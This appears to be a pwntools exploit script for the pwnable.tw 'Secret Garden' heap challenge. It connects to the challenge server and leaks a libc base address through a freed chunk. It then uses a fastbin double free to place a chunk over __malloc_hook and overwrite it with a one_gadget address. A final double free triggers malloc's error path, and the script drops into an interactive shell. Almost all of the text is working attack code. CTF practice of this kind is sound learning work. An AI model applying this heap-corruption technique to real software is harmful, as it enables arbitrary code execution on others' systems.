#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("secretgarden_patched")
libc = ELF("./libc_64.so.6")

local = False 
if local:
    p = process("./secretgarden_patched")
    gdb.attach(p,'''c''')
else:
    p = remote('chall.pwnable.tw', 10203)

elf = context.binary = ELF('./secretgarden_patched', checksec=False)

def raise_flower(leng, name, color):
    p.sendlineafter(b"Your choice :", b"1")
    p.sendlineafter(b"Length of the name :", str(leng))
    p.sendlineafter(b"The name of flower :", name)
    p.sendlineafter(b"The color of the flower :", color)
    print("========= raise_flower =========")

def visit():
    p.sendlineafter(b"Your choice :", b"2")
    print("========= visit =========")

def remove_flower(idx):
    p.sendlineafter(b"Your choice :", b"3")
    p.sendlineafter(b"from the garden:", str(idx))
    print("========= remove_flower =========")

def clean_garden():
    p.sendlineafter(b"Your choice :", b"4")
    print("========= clean_garden =========")

def leave_garden():
    p.sendlineafter(b"Your choice :", b"5")
    print("========= leave_garden =========")

#############
# LEAK_LIBC #
#############

raise_flower(0x80, b"a", b"red"*2+str(1).encode())
raise_flower(0x80, b"a", b"red"*2+str(1).encode())
remove_flower(0)
raise_flower(0x50, b"", b"red"*2)
visit()
p.recvuntil(b"Name of the flower[2] :")
libc.address = int.from_bytes(p.recv(6), 'little') - 3947274
malloc_hook = 3947280 + libc.address
free_hook = 3954600 + libc.address
og0 = 0x45216 + libc.address
og1 = 0x4526a + libc.address
og2 = 0xef6c4 + libc.address
og3 = 0xf0567 + libc.address

one_gadget = og2
print("[*]Libc_base:    ", hex(libc.address))
print("[*]Malloc_hook:  ", hex(malloc_hook))
print("[*]Free_hook:    ", hex(free_hook))
print("[*]One_gadget:   ", hex(one_gadget))



raise_flower(0x60, b"name"*2, b"A"*8)
raise_flower(0x60, b"name"*2, b"B"*8)
remove_flower(3)
remove_flower(4)
remove_flower(3)
raise_flower(0x60, p64(malloc_hook-35), b"A"*8)
raise_flower(0x60, b"a"*20, b"\x00"*8)
raise_flower(0x60, b"a"*20, b"\x00"*8)
raise_flower(0x60, b"\x00"*19 + p64(one_gadget), b"\x00")
clean_garden()
#p.sendlineafter(b"Your choice :", b"1")

remove_flower(5)
remove_flower(5)
'''
'''
p.interactive()